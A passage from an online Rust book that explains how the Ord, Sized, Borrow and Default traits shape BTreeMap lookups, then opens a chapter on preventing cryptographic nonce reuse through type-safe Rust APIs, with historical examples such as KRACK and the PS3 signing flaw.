This enables us to sort values.</p>
<p>Back in Chapter 3, we implemented the <code>Ord</code> trait for a structure representing an OS process.
This allowed sorting a list of processes by a specific definition of priority (the process's current state, in our case).</p>
<h3 id="the-sized-trait"><a class="header" href="#the-sized-trait">The <code>Sized</code> Trait</a></h3>
<p><code>Sized</code><sup class="footnote-reference" id="fr-Sized-1"><a href="#footnote-Sized">9</a></sup> is something known as a <em>marker trait</em>.
Unlike <code>Ord</code>, there's no "interface" methods to implement because <code>Sized</code> has no behavior of its own.
Marker traits <em>mark a property</em> instead of <em>specifying behavior</em> (plot twist!).</p>
<p>The trait bounds <code>T: Sized</code> tells the compiler that all values of type <code>T</code> have the same size in memory and that this size is known at compile time<sup class="footnote-reference" id="fr-Sizedness-1"><a href="#footnote-Sizedness">10</a></sup>.
For example, a <code>u32</code> is always 4 bytes long.</p>
<p>Here's where things get interesting: <code>T: ?Sized</code>, the binding used in the above signature (note the leading <code>?</code>), means values of type <code>T</code> are <em>optionally sized</em> - they <em>may or may not</em> be <code>Sized</code>.
Doesn't that seem weirdly ambiguous?</p>
<p>Turns out the ambiguity buys flexibility without introducing any UB.
The standard library designers wanted to handle both the common case and the exception.
The majority of types in Rust are sized, but a handful aren't.
Examples of unsized types include:</p>
<ul>
<li>
<p><strong>Slices:</strong> An slice, <code>[T]</code>, can contain zero or more contiguous <code>T</code>s - thus different slice values could have different sizes.</p>
<ul>
<li>Note that <code>&amp;[T]</code>, a reference to a slice, is always the size of a <em>fat</em> pointer (regular pointer plus slice length metadata).</li>
</ul>
</li>
<li>
<p><strong>Trait Objects:</strong> Rust has a mechanism for <em>dynamic dispatch</em><sup class="footnote-reference" id="fr-DynDis-1"><a href="#footnote-DynDis">11</a></sup>. The <code>dyn</code> keyword indicates a <em>trait object</em>: a value that implements a given trait. That value can be <em>any type</em> and have <em>any size</em>, so long as it implements the trait.</p>
<ul>
<li><code>Box&lt;dyn Error&gt;</code>, for example, is a pointer to an instance of any type implementing <code>Error</code> trait.</li>
</ul>
</li>
</ul>
<p>Now values <em>stored</em> in a collection, like <code>BTreeMap</code> must be <code>Sized</code>.
Otherwise we wouldn't know how to store them in memory.</p>
<p>But because <code>get</code> supports both sized and unsized types as a parameter (<code>Q: ?Sized</code>), <em>searching</em> <code>BTreeMap</code> is flexible.
We can find values associated with <em>sized keys</em> using <em>unsized keys</em> of a corresponding type.
We'll see a concrete example toward the end of this section.</p>
<h3 id="the-borrow-trait"><a class="header" href="#the-borrow-trait">The <code>Borrow</code> Trait</a></h3>
<p>A type that implements <code>Borrow&lt;T&gt;</code><sup class="footnote-reference" id="fr-Borrow-1"><a href="#footnote-Borrow">12</a></sup> can <em>borrow</em> a <em>reference</em>, <code>&amp;T</code>.
Unlike the similar trait <code>AsRef</code><sup class="footnote-reference" id="fr-AsRef-1"><a href="#footnote-AsRef">13</a></sup>, <code>Borrow</code> requires that the borrowed <code>&amp;T</code> have the same comparison and hash semantics as <code>T</code>.
Sounds relevant to <code>BTreeMap</code> (lookup via a sequence of comparisons) and <code>HashMap</code>s (lookup via a hash), right?</p>
<p>It very much is - the <code>Borrow</code> trait is designed to make collection lookups easier and more efficient.
In fact, the standard library includes a "blanket implementation" (always pre-implemented trait) for all types <code>T</code> to be able to borrow themselves (meaning we get <code>T: Borrow&lt;T&gt;</code> for "free").</p>
<p>This enables key lookups without having to create a copy of the key in memory.
So no need for additional heap allocations if searching a <code>BTreeMap&lt;String, T&gt;</code> by a key of type <code>&amp;str</code>.</p>
<h2 id="putting-it-all-together"><a class="header" href="#putting-it-all-together">Putting it all together</a></h2>
<p>To really grok how <code>Ord</code>, <code>Sized</code>, and <code>Borrow</code> impact API usage in combination, let's walk through an example.</p>
<p>Say we store 8-byte hexspeak<sup class="footnote-reference" id="fr-Hexspeak-1"><a href="#footnote-Hexspeak">14</a></sup> words, e.g. values of type <code>[u8; 8]</code>, in a set.
We later get a list of user-provided hexspeak words of varying sizes, e.g. values of type <code>Vec&lt;u8&gt;</code>.
Some may be 8 bytes long, others may not.</p>
<p>We want to be able to use the <code>get</code> method to check if any user-provided words are already in our set.
Luckily, <code>get</code> lets us search for <em>slices</em> (unsized <code>[u8]</code>).
We can use the arbitrarily-sized, user-provided words as search keys for our set of fixed-size (8-byte words)!</p>
<pre><code class="language-rust noplaypen">use std::collections::BTreeSet;

// Two hexspeak words
let bad_code: [u8; 8] = [0xB, 0xA, 0xA, 0xD, 0xC, 0x0, 0xD, 0xE];
let bad_food: [u8; 8] = [0xB, 0xA, 0xA, 0xD, 0xF, 0x0, 0x0, 0xD];

// Note we're about to store uniformly sized values in our set
assert_eq!(std::mem::size_of_val(&amp;bad_code), 8);
assert_eq!(std::mem::size_of_val(&amp;bad_food), 8);

// Store the two words in our set
let mut set = BTreeSet::new();
set.insert(bad_code);
set.insert(bad_food);

// Vec&lt;u8&gt; is sized, it's actually a fat pointer to a heap buffer.
// But slices of the vec are unsized! For example:
//     &amp;my_vec[0..5] is the first 5 elements
//     &amp;my_vec[1..] is all but the first element
//     &amp;my_vec[..] is all elements
let bad_food_vec: Vec&lt;u8&gt; = vec![0xB, 0xA, 0xA, 0xD, 0xF, 0x0, 0x0, 0xD];
let bad_dude_vec: Vec&lt;u8&gt; = vec![0xB, 0xA, 0xA, 0xD, 0xD, 0x0, 0x0, 0xD];
let cafe_bad_food_vec: Vec&lt;u8&gt; = vec![
    0xC, 0xA, 0xF, 0xE, 0xB, 0xA, 0xA, 0xD, 0xF, 0x0, 0x0, 0xD
];

// Search for a [u8; 8] present
assert_eq!(
    set.get(&amp;bad_food_vec[..]),         // 0xBAADFOOD
    Some(&amp;[0xB, 0xA, 0xA, 0xD, 0xF, 0x0, 0x0, 0xD])
);

// Search for a [u8; 4] not present
assert_eq!(
    set.get(&amp;bad_food_vec[..4]),        // 0xBAAD
    None
);

// Search for an [u8; 8] not present
assert_eq!(
    set.get(&amp;bad_dude_vec[..]),         // 0xBAADDUDE
    None
);

// Search for a [u8; 8] present
assert_eq!(
    set.get(&amp;cafe_bad_food_vec[4..]),   // 0xBAADF00D
    Some(&amp;[0xB, 0xA, 0xA, 0xD, 0xF, 0x0, 0x0, 0xD]),
);

// Search for a [u8; 12] not present
assert_eq!(
    set.get(&amp;cafe_bad_food_vec[..]),    // 0xCAFEBAADF00D
    None
);</code></pre>
<p>So what happened to enable searching fixed-length set elements (<code>[u8; 8]</code>) using arbitrary length (<code>[u8]</code>) keys?
Consider what the compiler converted our generic <code>get</code> callsites into, through the magic of monomorphization:</p>
<pre><code class="language-rust ignore">pub fn get(&amp;self, key: &amp;[u8]) -&gt; Option&lt;&amp;[u8; 8]&gt;
{
    // ...function body of code in our compiled binary...
}</code></pre>
<ul>
<li>
<p><strong><code>Ord</code> and <code>Sized</code></strong> - The trait bound <code>Q: Ord + ?Sized</code> means we're free to search using an arbitrarily sized slice, so long as the slice's contents can be sorted. <code>[u8]</code> meets that criteria. In the above, we converted user-provided vectors into slices.</p>
</li>
<li>
<p><strong><code>Ord</code> and <code>Borrow</code></strong> - The trait bound <code>K: Borrow&lt;Q&gt; + Ord</code> enables that conversion. We can search using any key that can borrow the aforementioned arbitrarily-sized-and-sortable slice. A <code>Vec</code> can view its elements as a contiguous slice, regardless of how many are stored. Since <code>Vec&lt;T&gt;</code> implements <code>Borrow&lt;[T]&gt;</code>, <code>Vec</code> can also borrow that slice from itself (no data copied!). Thus <code>&amp;my_vec[..]</code> (slicing notation shorthand for <code>my_vec.as_slice()</code>) lets us pass in an <code>&amp;[u8]</code> key to search for.</p>
</li>
</ul>
<p>In conclusion, <code>BTreeMaps</code>'s <code>get</code> combines three traits (<code>Ord</code>, <code>?Sized</code>, and <code>Borrow</code>) to enable flexible, efficient APIs.</p>
<h3 id="taking-it-a-step-further-the-default-trait"><a class="header" href="#taking-it-a-step-further-the-default-trait">Taking It a Step Further: The <code>Default</code> Trait</a></h3>
<p>The library we build will bring a fourth trait into the mix: <code>Default</code><sup class="footnote-reference" id="fr-Default-1"><a href="#footnote-Default">15</a></sup>.
Like it sounds, this trait is for types that have a default value.
For example:</p>
<ul>
<li>
<p>The default for <code>isize</code> is <code>0</code>.</p>
</li>
<li>
<p>The default for <code>Option</code> is <code>None</code>.</p>
</li>
<li>
<p>The default for any dynamic collection (<code>Vec</code>, <code>BTreeSet</code>, <code>HashMap</code>, etc) is an empty instance of that collection.</p>
</li>
</ul>
<p>Our API will look like this:</p>
<pre><code class="language-rust ignore">/// Returns a reference to the value corresponding to the key.
pub fn get&lt;Q&gt;(&amp;self, key: &amp;Q) -&gt; Option&lt;&amp;V&gt;
where
    K: Borrow&lt;Q&gt; + Ord + Default,
    Q: Ord + Default + ?Sized,
{
    // ...function body here...
}</code></pre>
<p>Don't worry, it's easier to use than to read.
Yet the choice to require <code>Default</code> for keys and values is restrictive, users of our library have to ensure the trait is implemented for any custom type they want to store in one of our collections.</p>
<p>Why enforce that sort of limitation?
<code>Default</code> is like a "no argument constructor", it <em>ensures</em> that values of a type are <em>always safely initialized</em>.</p>
<p>It's a requirement for elements stored in <code>tinyvec</code><sup class="footnote-reference" id="fr-TinyVec-1"><a href="#footnote-TinyVec">16</a></sup>, the 3rd party <code>#![forbid(unsafe_code)]</code> library we used for our arena allocator in the previous chapter.
So the <code>Default</code> restriction is inherited from a dependency.</p>
<p>Imposing it is an assurance tradeoff.
We ask a little more of our users in exchange for a 100% safe binary, the guarantee that all our code and all dependencies of our code (e.g. the full library <em>supply chain</em>) maximizes memory safety.</p>
<p>If you are morally opposed to requiring <code>Default</code> and want to remain exactly API-compatible with the standard library, feel free to swap <code>tinyvec</code> for <code>smallvec</code><sup class="footnote-reference" id="fr-SmallVec-1"><a href="#footnote-SmallVec">17</a></sup> in your allocator now and adjust all non-test code for the remainder of this book.
<code>smallvec</code> is another stack-based <code>Vec</code> alternative.
It's used in Mozilla's Servo browser engine.</p>
<p>Unfortunately, <code>smallvec</code> contains <code>unsafe</code> code.
Security researchers have discovered multiple memory safety vulnerabilities in <code>smallvec</code>, for which CVEs have been assigned (e.g. CVE-2021-25900, CVE-2019-15554, CVE-2018-20991, etc).</p>
<p>While <code>smallvec</code> is popular and well-vetted, we can make no guarantee about the number of <em>undiscovered</em> memory safety vulnerabilities still present.
<code>tinyvec</code>, by contrast, will never fall victim to any memory corruption attacks - it's <code>#![forbid(unsafe_code)]</code>.</p>
<blockquote>
<p><strong>Any other traits should I know about?</strong></p>
<p>There isn't an official list of traits every Rust programmer should know.
But you'll almost certainly run into three traits related to memory allocation and deallocation: <code>Clone</code>, <code>Copy</code>, and <code>Drop</code>.
We've touched on some of these before, but they're worth revisiting.</p>
<ul>
<li>
<p><code>Clone</code><sup class="footnote-reference" id="fr-TraitClone-1"><a href="#footnote-TraitClone">18</a></sup> defines <em>deep</em> copy logic. <code>Clone</code> types must be <code>Sized</code>. Cloning could be expensive if the original needs to be recursively traversed - we have to allocate a counterpart to everything it owns.</p>
<ul>
<li>
<p>For example, copying <code>Vec&lt;String&gt;</code> means copying each <code>String</code>. <code>String</code> is a <code>Vec&lt;u8&gt;</code> internally, so copying each <code>String</code> means copying each <code>u8</code>. That was only 2 levels of recursion, but <code>Clone</code> could require arbitrarily many.</p>
</li>
<li>
<p>If your code is littered with <code>my_structure.clone()</code> calls, removing them <em>might</em> be a "low-hanging fruit" performance optimization. If you can refactor flows of ownership to process primarily references (e.g. replace <code>String</code> with <code>&amp;str</code>), you <em>might</em> save a precious time and memory. "Might" stems from the fact that performance optimizations need to be data driven, not premature. We'll cover micro-benchmarking in Chapter 12.</p>
</li>
</ul>
</li>
<li>
<p><code>Copy</code><sup class="footnote-reference" id="fr-TraitCopy-1"><a href="#footnote-TraitCopy">19</a></sup> is a marker trait for types that can be fully cloned with only a <em>shallow</em> byte-by-byte copy. That means there's no pointers to follow or external resources to duplicate a handle to.</p>
<ul>
<li>
<p>Consider <code>isize</code>, the platform-specific signed integer type. If we duplicate the small chunk of fixed-sized, consecutive bytes that encodes the integer's value then we get a complete replica of the original.</p>
</li>
<li>
<p><code>Copy</code> should be implemented sparingly. It means the assignment operator, <code>=</code>, will copy bytes (implicit "copy semantics") instead of just transferring ownership ("move semantics").</p>
</li>
</ul>
</li>
<li>
<p><code>Drop</code><sup class="footnote-reference" id="fr-TraitDrop-1"><a href="#footnote-TraitDrop">20</a></sup> defines a "destructor". User-definable deallocation logic, called when a variable of the implementing type goes out of scope. All memory and shared resources must be freed. Types that implement <code>Copy</code> are not allowed to implement <code>Drop</code> (these should be mutually exclusive - bitwise copyable memory can be bitwise erased).</p>
<ul>
<li>Note that if the scope of a variable's binding depends on conditional statements, move semantics will be tracked at runtime. The value can be moved here and there, based on which branch is taken, as the program runs. But in the end Rust will only drop it <em>once</em> - when the last-moved location goes out of scope.</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="takeaway-19"><a class="header" href="#takeaway-19">Takeaway</a></h2>
<p>As mere users of the standard library's <code>BTreeSet</code>/<code>BTreeMap</code>, the nuances of <code>Ord</code>, <code>?Sized</code>, and <code>Borrow</code> would likely be lost on us.
We could have long and prosperous careers without ever having to think about why a map <code>get</code> signature looks like it does.</p>
<p>But as designers and implementers of an API-compatible alternative, we want to empower our users with the same flexible abstractions the standard library provides.
That entails understanding these traits and how they interact.</p>
<p>The hexspeak example above wouldn't even have compiled if the standard library used the more intuitive signature we started this section with (<code>pub fn get&lt;K: Ord&gt;(&amp;self, key: &amp;K) -&gt; Option&lt;&amp;V&gt;</code>).
So the complexity we've covered has a major payoff: the same code seamlessly supports a broader range of use cases.</p>
<p>With all that trait binding background behind us, we know how and why specific interfaces are designed a certain way.
Now let's tackle the logic backing them: the core operations of our self-balancing scapegoat tree.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-BTreeSet">
<p><a href="https://doc.rust-lang.org/stable/std/collections/struct.BTreeSet.html"><em>Struct <code>std::collections::BTreeSet</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-BTreeSet-1">↩</a></p>
</li>
<li id="footnote-BTreeMap">
<p><a href="https://doc.rust-lang.org/std/collections/struct.BTreeMap.html"><em>Struct <code>std::collections::BTreeMap</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-BTreeMap-1">↩</a> <a href="#fr-BTreeMap-2">↩2</a></p>
</li>
<li id="footnote-TotalOrder">
<p><a href="https://en.wikipedia.org/wiki/Total_order">Total order</a> Wikipedia (Accessed 2022). <a href="#fr-TotalOrder-1">↩</a></p>
</li>
<li id="footnote-HashMap">
<p><a href="https://doc.rust-lang.org/std/collections/struct.HashMap.html"><em>Struct <code>std::collections::HashMap</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-HashMap-1">↩</a></p>
</li>
<li id="footnote-BTreeMapGet1">
<p><a href="https://doc.rust-lang.org/std/collections/struct.BTreeMap.html#examples-3"><em><code>BTreeMap</code> <code>get</code> API example</em></a>. The Rust Team (Accessed 2022). <a href="#fr-BTreeMapGet1-1">↩</a></p>
</li>
<li id="footnote-BTreeMapGet2">
<p><a href="https://doc.rust-lang.org/std/collections/struct.BTreeMap.html#method.get"><em><code>BTreeMap</code> <code>get</code> API</em></a>. The Rust Team (Accessed 2022). <a href="#fr-BTreeMapGet2-1">↩</a></p>
</li>
<li id="footnote-Ord">
<p><a href="https://doc.rust-lang.org/std/cmp/trait.Ord.html"><em>Trait <code>std::cmp::Ord</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-Ord-1">↩</a></p>
</li>
<li id="footnote-TotalOrd">
<p><a href="https://en.wikipedia.org/wiki/Total_order">Total order</a> Wikipedia (Accessed 2022). <a href="#fr-TotalOrd-1">↩</a></p>
</li>
<li id="footnote-Sized">
<p><a href="https://doc.rust-lang.org/std/marker/trait.Sized.html"><em>Trait <code>std::marker::Sized</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-Sized-1">↩</a></p>
</li>
<li id="footnote-Sizedness">
<p><a href="https://github.com/pretzelhammer/rust-blog/blob/master/posts/sizedness-in-rust.md"><em>Sizedness in Rust</em></a>.  pretzelhammer (2020). <a href="#fr-Sizedness-1">↩</a></p>
</li>
<li id="footnote-DynDis">
<p><a href="https://en.wikipedia.org/wiki/Dynamic_dispatch">Dynamic dispatch</a>. Wikipedia (Accessed 2022). One use case for dynamic dispatch is enabling <em>heterogeneous collections</em>. <code>Vec&lt;Box&lt;dyn Error&gt;&gt;</code>, for example, allows us to store a vector of <code>Error</code> objects, potentially of varying types. <a href="#fr-DynDis-1">↩</a></p>
</li>
<li id="footnote-Borrow">
<p><a href="https://doc.rust-lang.org/std/borrow/trait.Borrow.html"><em>Trait <code>std::borrow::Borrow</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-Borrow-1">↩</a></p>
</li>
<li id="footnote-AsRef">
<p><a href="https://doc.rust-lang.org/std/convert/trait.AsRef.html"><em>Trait <code>std::convert::AsRef</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-AsRef-1">↩</a></p>
</li>
<li id="footnote-Hexspeak">
<p><a href="https://en.wikipedia.org/wiki/Hexspeak">Hexspeak</a>. Wikipedia (Accessed 2022). <a href="#fr-Hexspeak-1">↩</a></p>
</li>
<li id="footnote-Default">
<p><a href="https://doc.rust-lang.org/std/default/trait.Default.html"><em>Trait <code>std::default::Default</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-Default-1">↩</a></p>
</li>
<li id="footnote-TinyVec">
<p><a href="https://crates.io/crates/tinyvec"><em><code>tinyvec</code></em></a>. Lokathor (Accessed 2022). <a href="#fr-TinyVec-1">↩</a></p>
</li>
<li id="footnote-SmallVec">
<p><a href="https://crates.io/crates/smallvec"><em><code>smallvec</code></em></a>. Simon Sapin, Ms2ger, Servo project (Accessed 2022). <a href="#fr-SmallVec-1">↩</a></p>
</li>
<li id="footnote-TraitClone">
<p><a href="https://doc.rust-lang.org/std/clone/trait.Clone.html"><em>Trait <code>std::clone::Clone</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitClone-1">↩</a></p>
</li>
<li id="footnote-TraitCopy">
<p><a href="https://doc.rust-lang.org/std/marker/trait.Copy.html"><em>Trait <code>std::marker::Copy</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitCopy-1">↩</a></p>
</li>
<li id="footnote-TraitDrop">
<p><a href="https://doc.rust-lang.org/std/ops/trait.Drop.html"><em>Trait <code>std::ops::Drop</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitDrop-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="building-a-differential-fuzzing-harness"><a class="header" href="#building-a-differential-fuzzing-harness">Building a Differential Fuzzing Harness</a></h1>
<blockquote>
<p><strong>Note:</strong> This section is a work-in-progress.
For a preview, please see this blog post:</p>
<p><a href="https://tiemoko.com/blog/diff-fuzz/">Beyond the Borrow Checker: Differential Fuzzing</a></p>
</blockquote>
<hr />
<div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="tactical-trust-platform-cryptography-for-developers-1-of-2"><a class="header" href="#tactical-trust-platform-cryptography-for-developers-1-of-2">Tactical Trust: Platform Cryptography for Developers (1 of 2)</a></h1>
<!---
* Side-by-side diagrams
--->
<style>
  .diagram-row {
    display: flex;
    justify-content: space-evenly;
    align-items: center;
  }

  .diagram-col {
    flex: 50%;
    max-width: 35%;
    padding-top: 1%;
    padding-bottom: 4%;
  }

  .diagram-col2 {
    flex: 50%;
    max-width: 40%;
    padding-top: 1%;
    padding-bottom: 4%;
  }

   .diagram-solo {
    flex: 100%;
    max-width: 75%;
    padding-top: 1%;
    padding-bottom: 4%;
  }
</style>
<p>Digital systems our society relies on all have some notion of <strong>trust</strong>.
A communicating party can identify, with confidence, <em>who</em> they are "talking" to (authentication).
And they can rest assured that their "conversation" is <em>private</em> (confidentiality).
Even non-networked systems will validate that code they flash or execute hasn't been <em>modified</em> or <em>corrupted</em> (integrity).</p>
<p>Cryptographic libraries are the technical mechanism underpinning properties like authentication, confidentiality, and integrity.
These imperfect software components are the foundation on which societal trust is built and maintained.
Thus exploitable flaws in crypto libs tend to have severe and widespread impact<sup class="footnote-reference" id="fr-MatterHeartbleed-1"><a href="#footnote-MatterHeartbleed">1</a></sup>.</p>
<p>Now this two-part section isn't about applied cryptography in the proper academic sense, we won't explain cryptographic primitives or protocol design from the ground up.
Let's assume those more formal concepts live in an ivory tower<sup class="footnote-reference" id="fr-Ivory-1"><a href="#footnote-Ivory">2</a></sup>.
We're medieval peasants fighting in mud that is long-surviving production software - shipping, patching, refactoring.</p>
<p>These sections are concerned with brutal realities of deploying [theoretically] sound designs - we aim to reduce certain risks inherent to real-world software.
It's one interpretation of what <strong>platform security engineering</strong> entails when shipping trust at scale.
Concepts we cover are language-agnostic: they likely apply to your problem domain and tech stack of choice.</p>
<blockquote>
<p><em><strong>How are we defining "platform security engineering"?</strong></em></p>
<p>Building libraries, frameworks, and tools that allow feature teams to ship both securely and quickly.
Essentially providing a "solid security foundation" for high-velocity software.
In terms of code-level consistency.</p>
</blockquote>
<h2 id="so-whats-the-agenda-for-this-two-part-section"><a class="header" href="#so-whats-the-agenda-for-this-two-part-section">So what's the agenda for this two-part section?</a></h2>
<p>Part 1 focuses on <em>code</em> (full, runnable source is available within the book repo under <code>code_snippets/chp14/tactical_trust</code>).
Our proof-of-concept programs aim to raise the bar for "shift left" automation, even if modestly (give the attacker an inch, they'll take a mile).
We'll sample solutions to two cryptographic platform security problems at different levels of the stack:</p>
<ul>
<li>
<p><strong>API:</strong> Can we systematically prevent nonce reuse vulnerabilities in an arbitrarily-large codebase?</p>
</li>
<li>
<p><strong>Supply-chain:</strong> How should CI enforce policies specific to cryptographic dependencies?</p>
</li>
</ul>
<p>Part 2 will focus on <em>concepts</em> but still include plenty of code. The emphasis is higher-level exploration of a {problem,solution} space.
We'll narrow scope to the problem of <em>information disclosure</em>, deep-diving vulnerabilities and state-of-the-art mitigations through the lens of two general threat models:</p>
<ul>
<li>
<p><strong>Man-in-the-Middle (MITM):</strong> Attacker intercepts network communications between two or more endpoints.</p>
</li>
<li>
<p><strong>Man-at-the-End (MATE):</strong> Attacker directly compromises one or more communication endpoints.</p>
</li>
</ul>
<blockquote>
<p><em><strong>What if I'm interested less in software engineering, more in cryptographic design?</strong></em></p>
<p>Good news, everyone!<sup class="footnote-reference" id="fr-GoodNews-1"><a href="#footnote-GoodNews">3</a></sup>
Although we're focused on code-level tactics, there's several quality, strategy-focused resources to meet you wherever you're currently at and help you construct correct designs. Here's a sample:</p>
<ul>
<li>
<p>Crypto novice but an experienced developer? → <a href="https://amzn.to/43ov045">"Real-world Cryptography" by Dave Wong</a><sup class="footnote-reference" id="fr-RWCBook-1"><a href="#footnote-RWCBook">4</a></sup></p>
</li>
<li>
<p>Work in applied cryptography professionally? → <a href="https://soatok.blog/category/cryptography/">Soatok's Cryptography Blog</a><sup class="footnote-reference" id="fr-SoatokBlog-1"><a href="#footnote-SoatokBlog">5</a></sup></p>
</li>
<li>
<p>At the cutting-edge of near-future cryptography? → <a href="https://rwc.iacr.org/">Real World Crypto Symposium</a><sup class="footnote-reference" id="fr-RWCConf-1"><a href="#footnote-RWCConf">6</a></sup></p>
</li>
</ul>
</blockquote>
<h2 id="api-prevent-nonce-reuse-with-stronger-types"><a class="header" href="#api-prevent-nonce-reuse-with-stronger-types">API: Prevent Nonce Reuse with Stronger Types</a></h2>
<p>"Nonce" is a portmanteau of "<span style="text-decoration: underline;">n</span>umber used only <span style="text-decoration: underline;">once</span>".
As the name implies: accidentally using the same nonce multiple times, aka <em>nonce reuse</em>, is a devastating footgun for many widely-used cryptographic algorithms.
Common operations rely on a random nonce as input in order to uphold critical security properties:</p>
<ul>
<li>
<p><strong>Encryption</strong> - Unique nonces are often called "Initialization Vectors" (IVs). They prevent <em>plaintext and/or key recovery</em> as well as <em>replay attacks</em> (malicious repetition of previous communications).</p>
<ul>
<li>WPA2 was the de facto standard for encryption on Wi-Fi networks from 2006 to 2020. Toward the end of that lifespan, researchers demonstrated a practical attack against all implementations <sup class="footnote-reference" id="fr-KRACK-1"><a href="#footnote-KRACK">7</a></sup>. By abusing re-transmission logic in the 4-way handshake between a Wi-Fi endpoint and a client joining the network, an attacker could force <em>reset/reuse</em> of the nonce/IV for all protocol-supported stream ciphers (e.g. "keystream reuse"). That means an attacker can decrypt, replay, and [in some cases] forge network packets. Full compromise of the transport layer (e.g. TCP but not HTTPS).</li>
</ul>
</li>
<li>
<p><strong>Signing</strong> - Unique nonces prevent <em>signature forging</em> (generating a passing signature for attacker-created data) and <em>signature duplication</em> (replay of previously-signed data).</p>
<ul>
<li>The Sony PlayStation 3 was poised to become the most secure game console ever made, with no true jailbreak 4 years into production. The PS3 used ECDSA to create a chain-of-trust from early boot to userspace app launch - cryptographically enforcing software license checks. ECDSA signing takes as input a nonce and a hash of data to sign. Hackers discovered  that Sony's implementation used a hardcoded nonce<sup class="footnote-reference" id="fr-PS3Signing-1"><a href="#footnote-PS3Signing">8</a></sup>. This flaw enabled trivial re-computation of the ECDSA <em>private</em> signing key and therefore attacker ability to execute arbitrary unlicensed software.</li>
</ul>
</li>
</ul>
<br>
<body>
  <div class="diagram-row">
    <div class="diagram-solo">
      <img src="chp14/tt_nonce_reuse.svg" alt="Nonce reuse in context of encryption">
      <br>
      <figcaption><i><center><b>Fig. 1:</b> Nonce reuse: a single nonce used for multiple encryption operations (red input, step 3+).</center></i></figcaption>
    </div>
  </div>
</body>
<p>So then: how do we prove that, in some arbitrarily-large codebase, all nonces are both random and single-use?
By encoding safety invariants into the language's <em>type system</em>.
We can create APIs that are nearly impossible to misuse, and we get automatic static verification of that correctness just by compiling a program which uses exclusively the safe APIs!</p>
<p>Bold claim, yet relatively straight-forward implementation:</p>
<pre><code class="language-rust ignore">use aead::{
    Aead, AeadCore, Nonce, Payload,
    rand_core::{CryptoRng, RngCore},
};
use core::error::Error;

/// Can be used in arbitrarily many decryption operations.
/// Its counterpart, [`EncryptionNonce`], can only be used for one encryption operation.
pub type DecryptionNonce&lt;A&gt; = Nonce&lt;A&gt;;

/// A safer nonce type for AEAD. See trait [`NonceSafeAead`].
//
// SECURITY: Intentionally opaque and unique. Do not derive/implement any of:
// `Default`, `Copy`, `Clone`, `Ord`, `Eq`, `Debug`, etc.
pub struct EncryptionNonce&lt;A: AeadCore&gt;(Nonce&lt;A&gt;);

impl&lt;A: AeadCore&gt; EncryptionNonce&lt;A&gt; {
    /// Generate a new random nonce for AEAD-specific encryption.
    pub fn generate_nonce(rng: impl CryptoRng + RngCore) -&gt; Self {
        EncryptionNonce(&lt;A as AeadCore&gt;::generate_nonce(rng))
    }

    /// Crate-private conversion into [`aead::Nonce`].
    //
    // SECURITY: Do not make `pub`, risks reuse with `aead::Aead` APIs.
    fn less_safe_to_raw_nonce(self) -&gt; Nonce&lt;A&gt; {
        self.0
    }
}

/// Nonce-safe AEAD. Guarantees the following properties:
///
/// 1. Nonce is random.
///     * Opaque type with rand-only constructor.
/// 2. Nonce is used in exactly one encryption operation.
///     * Pass-by-value consumption.
///
/// See also: [`EncryptionNonce`] and [`DecryptionNonce`].
pub trait NonceSafeAead {
    /// Encrypt plaintext payload with a random, single-use nonce.
    /// Returns ciphertext bytes and decryption-only nonce.
    fn nonce_safe_encrypt&lt;'msg, 'aad&gt;(
        &amp;self,
        enc_nonce: EncryptionNonce&lt;Self&gt;,
        plaintext: impl Into&lt;Payload&lt;'msg, 'aad&gt;&gt;,
    ) -&gt; Result&lt;(Vec&lt;u8&gt;, DecryptionNonce&lt;Self&gt;), impl Error&gt;
    where
        Self: AeadCore + Aead + Sized,
    {
        let nonce = enc_nonce.less_safe_to_raw_nonce();
        self.encrypt(&amp;nonce, plaintext)
            .map(|ciphertext| (ciphertext, nonce))
    }

    /// Decrypt ciphertext.
    /// Identical to [`aead::Aead::decrypt`], defined so that [`aead::Aead`]
    /// doesn't have to be brought in-scope when using [`NonceSafeAead`].
    //
    // SECURITY: ban import of less safe `aead::Aead` trait.
    fn decrypt&lt;'msg, 'aad&gt;(
        &amp;self,
        dec_nonce: &amp;DecryptionNonce&lt;Self&gt;,
        ciphertext: impl Into&lt;Payload&lt;'msg, 'aad&gt;&gt;,
    ) -&gt; Result&lt;Vec&lt;u8&gt;, impl Error&gt;
    where
        Self: AeadCore + Aead + Sized,
    {
        &lt;Self as Aead&gt;::decrypt(self, dec_nonce, ciphertext)
    }
}

// Use above default impl for below algorithms
impl NonceSafeAead for chacha20poly1305::XChaCha20Poly1305 {}
impl NonceSafeAead for aes_gcm::Aes256Gcm {}
